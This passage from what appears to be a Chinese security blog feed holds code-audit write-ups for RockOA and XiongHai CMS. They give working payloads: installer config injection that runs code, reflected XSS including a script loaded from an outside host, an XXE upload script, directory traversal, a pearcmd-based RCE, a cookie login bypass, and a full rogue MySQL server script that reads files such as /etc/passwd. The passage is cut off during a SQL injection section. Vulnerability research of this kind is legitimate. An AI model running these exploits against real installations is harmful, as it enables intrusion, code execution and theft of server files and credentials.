class="line"><span class="keyword">if</span>($<span class="keyword">this</span>-&gt;isempt($msg))&#123;</span><br><span class="line"><span class="meta">@mysql_select_db($base, $conn)</span>;</span><br><span class="line">$msg = mysql_error();</span><br><span class="line"></span><br><span class="line"><span class="comment">//数据库不存在就创建</span></span><br><span class="line"><span class="keyword">if</span>(!$<span class="keyword">this</span>-&gt;isempt($msg))&#123;</span><br><span class="line"><span class="meta">@mysql_query(&quot;CREATE DATABASE `$base` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci&quot;)</span>;</span><br><span class="line">$msg = mysql_error();</span><br><span class="line"><span class="keyword">if</span>($<span class="keyword">this</span>-&gt;isempt($msg))&#123;</span><br><span class="line"><span class="meta">@mysql_select_db($base, $conn)</span>;</span><br><span class="line">$msg = mysql_error();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$<span class="keyword">this</span>-&gt;isempt($msg))&#123;</span><br><span class="line">$msg = <span class="string">&#x27;&#x27;</span>.$base.<span class="string">&#x27;数据库名不存在/不能创建&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($<span class="keyword">this</span>-&gt;isempt($msg))&#123;</span><br><span class="line">mysql_query(<span class="string">&quot;SET NAMES &#x27;utf8&#x27;&quot;</span>);</span><br><span class="line">$dburl = ROOT_PATH.<span class="string">&#x27;/rainrock.sql&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dburl))$msg = <span class="string">&#x27;数据库sql文件不存在&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($<span class="keyword">this</span>-&gt;isempt($msg))&#123;</span><br><span class="line">$sqlss = file_get_contents($dburl);</span><br><span class="line">$a = explode(<span class="string">&quot;;&quot;</span>, $sqlss);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($a)-<span class="number">1</span>; $i++)&#123;</span><br><span class="line">$sql = $a[$i];</span><br><span class="line">$sql= str_replace(<span class="string">&#x27;`rock_&#x27;</span>, <span class="string">&#x27;`&#x27;</span>.$perfix.<span class="string">&#x27;&#x27;</span>, $sql); <span class="comment">//前缀替换</span></span><br><span class="line">$bo = mysql_query($sql, $conn);</span><br><span class="line"><span class="keyword">if</span>(!$bo)&#123;</span><br><span class="line">$msg = <span class="string">&#x27;导入文件失败&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($<span class="keyword">this</span>-&gt;isempt($msg))&#123;</span><br><span class="line">mysql_query(<span class="string">&quot;update `&quot;</span>.$perfix.<span class="string">&quot;option` set `value`=&#x27;$title&#x27; where `num`=&#x27;systemtitle&#x27;&quot;</span>);<span class="comment">//系统标题</span></span><br><span class="line">$txt = <span class="string">&quot;&lt;?php</span></span><br><span class="line"><span class="string">return array(</span></span><br><span class="line"><span class="string">&#x27;url&#x27;=&gt; &#x27;$url&#x27;,//系统URL</span></span><br><span class="line"><span class="string">&#x27;title&#x27;=&gt; &#x27;$title&#x27;,//系统默认标题</span></span><br><span class="line"><span class="string">&#x27;db_host&#x27;=&gt; &#x27;$host&#x27;,//数据库地址</span></span><br><span class="line"><span class="string">&#x27;db_user&#x27;=&gt; &#x27;$user&#x27;,//用户名</span></span><br><span class="line"><span class="string">&#x27;db_pass&#x27;=&gt; &#x27;$pass&#x27;,//密码</span></span><br><span class="line"><span class="string">&#x27;db_base&#x27;=&gt; &#x27;$base&#x27;,//数据库名称</span></span><br><span class="line"><span class="string">&#x27;perfix&#x27;=&gt; &#x27;$perfix&#x27;,//表名前缀</span></span><br><span class="line"><span class="string">&#x27;qom&#x27;=&gt; &#x27;$qom&#x27;,//session、cookie前缀</span></span><br><span class="line"><span class="string">&#x27;highpass&#x27;=&gt; &#x27;$highpass&#x27;,//超级管理员密码，可用于登录任何帐号</span></span><br><span class="line"><span class="string">&#x27;install&#x27;=&gt; true//已安装，不要去掉啊</span></span><br><span class="line"><span class="string">);&quot;</span>;</span><br><span class="line">$<span class="keyword">this</span>-&gt;rock-&gt;createtxt(<span class="string">&#x27;webrock/webrockConfig.php&#x27;</span>, $txt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($<span class="keyword">this</span>-&gt;isempt($msg))$msg = <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">echo $msg;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此最终可以构造，前提要有个可以连接的服务器不然连接不上就无法执行后面的语句了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">host=xxx:<span class="number">3306</span>&amp;user=admin&amp;pass=admin123&amp;base=ry&amp;perfix=yy_&amp;qom=<span class="string">&#x27;,&quot;123&quot;=&gt;phpinfo(),//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://xxxx/rock.php?a=save&amp;m=install&amp;ajaxbool=true</span></span><br></pre></td></tr></table></figure><p>接下来只需要访问<code>http://xxxx/webrock/webrockConfig.php</code>,其实首页也行毕竟是配置文件肯定全局引入了的</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/6.png"></p><h3 id="前台XSS"><a href="#前台XSS" class="headerlink" title="前台XSS"></a>前台XSS</h3><p>因为在路由出现找不到类的时候会直接echo绝对路径等信息，还可以用户控制部分字符那就很容易进行XSS了,这里不上代码了上面分析架构的时候说过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xxxxx/rock.php?a=zz&amp;m=flowz&lt;script&gt;alert(&quot;Hacked By Y4tacker&quot;)&lt;/script&gt;&amp;d=&amp;ajaxbool=true</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/8.png"></p><p>当然还可以配合rougue mysql server做任意文件读取，这里就不展开了</p><h2 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h2><p>前台功能不多，那现在进入后台，个人也是有洁癖的只喜欢前台洞或者一条从前台到后台的完整利用</p><p>现在前台也已经有sql注入了，后台的注入也有<code>很多,数不胜数</code>但是没啥意义了，漏洞原理都是一样的无过滤+参数拼接造成命令逃逸，后台XSS点也很多也是一样没意义了,这里就列举一些不一样的点</p><h3 id="后台XXE"><a href="#后台XXE" class="headerlink" title="后台XXE"></a>后台XXE</h3><p>这里就简单做个POC验证即可，可以看到在<code>webrock/humanres/kaoqin/kaoqinAction.php</code><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/9.png"></p><p>看看这个reader其实就是解析Excel的一个功能，这时候不难想到可能存在xxe</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/10.png"></p><p>在canRead当中，可以看见首先对<code>_rels/.rels</code>做了simplexml_load_string处理，存在xxe，后面我们都不需要伪造完整的excel格式的文件了<img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/11.png"></p><p>这里简单测试一波能接收到url请求的连接就行，之后重命名为<code>.rels</code>即可</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/12.png"></p><p>简单python发波包</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xxxx/rock.php?a=import&amp;m=kaoqin&amp;d=humanres&amp;ajaxbool=true&quot;</span></span><br><span class="line"></span><br><span class="line">r= requests.post(url,files=&#123;<span class="string">&quot;file&quot;</span>:open(<span class="string">&quot;1.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/13.png"></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Y4教你审计系列之熊海CMS代码审计</title>
      <link href="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="熊海CMS代码审计"><a href="#熊海CMS代码审计" class="headerlink" title="熊海CMS代码审计"></a>熊海CMS代码审计</h1><h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>审计代码从架构开始，这个CMS架构比较简单，简单的MVC设计模式，根据参数r决定路由的分发，这个路由分发可能导致一个致命的缺陷导致最终实现RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="variable">$file</span>=addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); </span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="由此可能存在的前台RCE"><a href="#由此可能存在的前台RCE" class="headerlink" title="由此可能存在的前台RCE"></a>由此可能存在的前台RCE</h3><p>我们知道熊海安装会先判断同文件夹下有无InstallLock.txt作为是否安装的判断标准</p><p>那如果我们通过上面这个路由分发实现目录穿越，那当前目录也就是web目录下的index.php是没有这个文件的</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png"></p><p>没有对参数做处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$save=$_POST[&#x27;save&#x27;];</span><br><span class="line">$user=$_POST[&#x27;user&#x27;];</span><br><span class="line">$password=md5($_POST[&#x27;password&#x27;]);</span><br><span class="line">$dbhost=$_POST[&#x27;dbhost&#x27;];</span><br><span class="line">$dbuser=$_POST[&#x27;dbuser&#x27;];</span><br><span class="line">$dbpwd=$_POST[&#x27;dbpwd&#x27;];</span><br><span class="line">$dbname=$_POST[&#x27;dbname&#x27;];</span><br></pre></td></tr></table></figure><p>可惜由于有第一行include失败导致代码终止，不然通过这个我们一方面可以尝试fakemysql读取任意文件，另一方面可以实现往web目录上一层写文件之后再包含实现RCE，有点可惜</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png"></p><p>有没有解决的办法呢？有那就是找一个和install/index.php相对路径相同的并且存在如上代码的地方，有么</p><p>答案是有，我们可以通过此路由成功保留install的所有功能</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/14.png"></p><h3 id="前台配合目录穿越读文件"><a href="#前台配合目录穿越读文件" class="headerlink" title="前台配合目录穿越读文件"></a>前台配合目录穿越读文件</h3><p>可以看见mysql成功建立连接</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/15.png"></p><p>但是毕竟admin目录下没有sql文件，如果能配合文件上传也能搞事情待会儿研究下</p><p>不过这时候可以做一件事情，通过fakemysql去读任意文件了，也是存在的点，这里由于php版本不一致需要构造不同的tcp数据包，这里我用了github上找到的一个和我php5.2版本能用的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unhex</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123; <span class="keyword">return</span> pack(<span class="string">&quot;H*&quot;</span>, preg_replace(<span class="string">&#x27;#[^a-f0-9]+#si&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>)); &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$srv</span> = stream_socket_server(<span class="string">&quot;tcp://0.0.0.0:1237&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Enter filename to get [<span class="subst">$filename</span>] &gt; &quot;</span>;</span><br><span class="line">  <span class="variable">$newFilename</span> = rtrim(fgets(STDIN), <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$newFilename</span>)) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$newFilename</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;[.] Waiting for connection on 0.0.0.0:1237\n&quot;</span>;</span><br><span class="line">  <span class="variable">$s</span> = stream_socket_accept(<span class="variable">$srv</span>, -<span class="number">1</span>, <span class="variable">$peer</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;[+] Connection from <span class="subst">$peer</span> - greet... &quot;</span>;</span><br><span class="line">  fwrite(<span class="variable">$s</span>, unhex(<span class="string">&#x27;45 00 00 00 0a 35 2e 31  2e 36 33 2d 30 75 62 75</span></span><br><span class="line"><span class="string">                    6e 74 75 30 2e 31 30 2e  30 34 2e 31 00 26 00 00</span></span><br><span class="line"><span class="string">                    00 7a 42 7a 60 51 56 3b  64 00 ff f7 08 02 00 00</span></span><br><span class="line"><span class="string">                    00 00 00 00 00 00 00 00  00 00 00 00 64 4c 2f 44</span></span><br><span class="line"><span class="string">                    47 77 43 2a 43 56 63 72  00                     &#x27;</span>));</span><br><span class="line">  fread(<span class="variable">$s</span>, <span class="number">8192</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;auth ok... &quot;</span>;</span><br><span class="line">  fwrite(<span class="variable">$s</span>, unhex(<span class="string">&#x27;07 00 00 02 00 00 00 02  00 00 00&#x27;</span>));</span><br><span class="line">  fread(<span class="variable">$s</span>, <span class="number">8192</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;some shit ok... &quot;</span>;</span><br><span class="line">  fwrite(<span class="variable">$s</span>, unhex(<span class="string">&#x27;07 00 00 01 00 00 00 00  00 00 00&#x27;</span>));</span><br><span class="line">  fread(<span class="variable">$s</span>, <span class="number">8192</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;want file... &quot;</span>;</span><br><span class="line">  fwrite(<span class="variable">$s</span>, chr(strlen(<span class="variable">$filename</span>) + <span class="number">1</span>) . <span class="string">&quot;\x00\x00\x01\xFB&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">  stream_socket_shutdown(<span class="variable">$s</span>, STREAM_SHUT_WR);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;[+] <span class="subst">$filename</span> from <span class="subst">$peer</span>:\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$len</span> = fread(<span class="variable">$s</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$len</span>)) &#123;</span><br><span class="line">    <span class="keyword">list</span> (, <span class="variable">$len</span>) = unpack(<span class="string">&quot;V&quot;</span>, <span class="variable">$len</span>);</span><br><span class="line">    <span class="variable">$len</span> &amp;= <span class="number">0xffffff</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$len</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="variable">$chunk</span> = fread(<span class="variable">$s</span>, <span class="variable">$len</span>);</span><br><span class="line">      <span class="variable">$len</span> -= strlen(<span class="variable">$chunk</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$chunk</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line">  fclose(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单测试一波成功读取到配置文件</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/18.png"></p><p>可惜后台也不能任意上传文件到admin的fiels目录下，而且config.json配置当中不支持json后缀，就到此结束吧</p><h3 id="真正的前台RCE"><a href="#真正的前台RCE" class="headerlink" title="真正的前台RCE"></a>真正的前台RCE</h3><p>因为是宝塔安装的缘故所以很容易猜测到宝塔php的安装路径<code>/www/server/php/52/</code>，这里介绍另一个trick的使用也就是pearcmd.php，<code>在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。</code>，这里这个老cms一定是只能5版本所以一定可以</p><p>因此构造payload，往/tmp/hello.php写文件即可</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/20.png"></p><p>之后文件包含成功RCE</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/21.png"></p><h2 id="逻辑绕过免密码登入后台-垂直越权"><a href="#逻辑绕过免密码登入后台-垂直越权" class="headerlink" title="逻辑绕过免密码登入后台-垂直越权"></a>逻辑绕过免密码登入后台-垂直越权</h2><p>鉴权函数很简单，所以只要设置cookie当中user为任意字符即可进入后台</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/19.png"></p><h2 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h2><p>既然默认是从files文件夹下做为路由的主文件，我们不妨先从files文件夹开始，文件也不多，在每个文件当中先做了一件事情，这部分没啥漏洞，r本来就是决定路由分发的，而且有addslashes无法逃逸单引号，除非能控制数据库内容可以形成xss</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;inc/conn.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;inc/time.class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM settings&quot;</span>;</span><br><span class="line"><span class="variable">$resul</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQL语句有误：&#x27;</span>.mysql_error());</span><br><span class="line"><span class="variable">$info</span> = mysql_fetch_array(<span class="variable">$resul</span>);</span><br><span class="line"><span class="variable">$llink</span>=addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM nav WHERE link=&#x27;<span class="subst">$llink</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$resul</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQL语句有误：&#x27;</span>.mysql_error());</span><br><span class="line"><span class="variable">$navs</span> = mysql_fetch_array(<span class="variable">$resul</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="前台XSS1-突破addslashes字符限制"><a href="#前台XSS1-突破addslashes字符限制" class="headerlink" title="前台XSS1+突破addslashes字符限制"></a>前台XSS1+突破addslashes字符限制</h3><p>在contact.php当中，接收到page参数并回显，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$page</span>=addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span>&lt;&gt;<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span>&lt;&gt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$pages</span>=<span class="string">&quot;第&quot;</span>.<span class="variable">$page</span>.<span class="string">&quot;页 - &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此可以通过payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&lt;<span class="regexp">/a&gt;&lt;script&gt;alert(123)&lt;/</span>script&gt;&lt;a&gt;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4.png"></p><p>但是这里又有了一个新的问题，addslashes导致我们不能带引号，那怎么办呢？下面给一个解决方式，很简单就不多说啦，这里src可以不加引号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r=contact&amp;page=<span class="number">2333</span>&lt;/a&gt;&lt;script src=http:<span class="comment">//xxxx/1.js&gt;&lt;/script&gt;&lt;a&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png"></p><p>又或者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r=contact&amp;page=<span class="number">2333</span>&lt;/a&gt;&lt;script&gt;alert(/Hacked By y4tacker/)&lt;/script&gt;&lt;a&gt;</span><br></pre></td></tr></table></figure><h3 id="前台XSS2"><a href="#前台XSS2" class="headerlink" title="前台XSS2"></a>前台XSS2</h3><p>在content页面，id可控制cookie也可控制不演示了，懂得都懂</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7.png"></p><h3 id="前台XSS3-同样例子太多就不列举了"><a href="#前台XSS3-同样例子太多就不列举了" class="headerlink" title="前台XSS3-同样例子太多就不列举了"></a>前台XSS3-同样例子太多就不列举了</h3><p>这个更离谱，无过滤后面还有输出yema参数同样不演示了，没意义，同样的例子很多</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/8.png"></p><h3 id="前台SQL注入-content-software两个页面同理"><a href="#前台SQL注入-content-software两个页面同理" class="headerlink" title="前台SQL注入 content/software两个页面同理"></a>前台SQL注入 content/software两个页面同理</h3><p>由于有addslashes，造成不难逃逸引号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;inc/conn.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;inc/time.class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM settings&quot;</span>;</span><br><span class="line"><span class="variable">$resul</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQL语句有误：&#x27;</span>.mysql_error());</span><br><span class="line"><span class="variable">$info</span> = mysql_fetch_array(<span class="variable">$resul</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;cid&#x27;</span>]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM content WHERE id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$resul</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span 